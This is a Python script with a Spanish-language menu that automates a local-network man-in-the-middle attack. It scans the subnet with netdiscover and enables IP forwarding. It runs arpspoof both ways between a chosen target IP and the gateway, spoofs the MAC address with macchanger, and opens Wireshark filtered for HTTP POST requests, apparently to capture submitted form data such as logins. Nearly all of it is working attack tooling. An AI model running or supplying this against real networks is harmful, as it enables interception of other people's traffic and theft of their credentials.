import subprocess
import os
import time

def device():
    proc = subprocess.Popen(["ip add | grep -i 'BROADCAST' | awk '{print $2 }'"], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    eth = out.decode("utf-8")
    newEth = eth[0:4]
    return newEth


def weird_thing(router):
    lista = []
    for i in range(len(router)):
        match router[i]:
            case '0':
                lista.append(router[i])
            case '1':
                lista.append(router[i])
            case '2':
                lista.append(router[i])
            case '3':
                lista.append(router[i])
            case '4':
                lista.append(router[i])
            case '5':
                lista.append(router[i])
            case '6':
                lista.append(router[i])
            case '7':
                lista.append(router[i])
            case '8':
                lista.append(router[i])
            case '9':
                lista.append(router[i])
            case '.':
                lista.append(router[i])
        bla = ''.join(lista)
    return bla

def actualizar():
    os.system('sudo apt-get update')
    os.system('sudo apt-get -y install gnome-terminal')

def escanear_red(rango_red):
    print("Escaneando la red...")
    os.system(f'gnome-terminal -- bash -c "sudo netdiscover -r {rango_red}/24; exec bash"')
    
def arp_attack(target):
    forward_up()
    proc = subprocess.Popen(["route | grep -i 'default'| awk '{print $2 }'"], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    router = out.decode("utf-8")
    new_router = weird_thing(router)
    os.system(f'gnome-terminal -- bash -c "sudo arpspoof -i {device()} -t {target} {new_router}; exec bash"')
    os.system(f'gnome-terminal -- bash -c "sudo arpspoof -i {device()} -t {new_router} {target}; exec bash"') 
    
def forward_up():
    proc = subprocess.Popen(["cat /proc/sys/net/ipv4/ip_forward"], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    ipforward = out.decode("utf-8")
    if ipforward == "0":
    	os.system('echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward')
    
def forward_down():
    proc = subprocess.Popen(["cat /proc/sys/net/ipv4/ip_forward"], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    ipforward = out.decode("utf-8")
    if ipforward == "1":
    	os.system('echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward')
    	
def mac(x):
    print("Esperando por lo cambios... (20 sec)")
    os.system(f'sudo ifconfig {device()} down')
    time.sleep(10)
    os.system(f'sudo macchanger {x} {device()}')
    os.system(f'sudo ifconfig {device()} up')
    time.sleep(10)
    os.system(f'sudo macchanger -s {device()}')
    	

def main():
    x = True
    while x:
        print("Hello World!")
        answer = input('Wanna run the program? (mac/scan/attack/wireshark/gnome/exit)...')
        match answer:
        
            case 'scan':
            	proc = subprocess.Popen(["route | grep -i '255.255.255.0'| awk '{print $1 }'"], stdout=subprocess.PIPE, shell=True)
            	(out, err) = proc.communicate()
            	red = out.decode("utf-8")
            	print("Red encontrada: " + red)
            	proc2 = subprocess.Popen(["route | grep -i 'default'| awk '{print $2 }'"], stdout=subprocess.PIPE, shell=True)
            	(out2, err2) = proc2.communicate()
            	router = out2.decode("utf-8")
            	print("Router encontrado: " + router)
            	escanear_red(red)
            
            case 'attack':
            	target = input("Inserte la IP deseada: ")
            	arp_attack(target)
            	print("Ataque exitoso")
  
            case 'wireshark':
                y = True
                while y:
                    print("a) Capturar port 8080")
                    print("b) Capturar POST de http")
                    print("c) Exit")
                    tipo = input()
                    match tipo:
                        case 'a':
                            os.system('sudo wireshark -k -Y "tcp.port==80"')
                        case 'b':
                            os.system('sudo wireshark -k -Y "http.request.method == "POST""')
                        case 'c':
                            y = False
            
            case 'gnome':
                actualizar()
                
            case 'mac':
                print("a) Cambiar a mac falsa")
                print("b) Cambiar a mac real")
                tipo = input()
                match tipo:
                    case 'a':
                        mac("-r")
                    case 'b':
                        mac("-p")
 
 
 
            case 'test':
                proc = subprocess.Popen(["ip add | grep -i 'BROADCAST' | awk '{print $2 }'"], stdout=subprocess.PIPE, shell=True)
                (out, err) = proc.communicate()
                eth = out.decode("utf-8")
                newEth = eth[0:4]
                print(newEth)
                print(device())
                


                print('Ble')
                
            case 'exit':
            	forward_down()
            	x = False   
            	 
            case _:
                print('[Comando incorrecto]')
            	
    
if __name__ == "__main__":
    main()
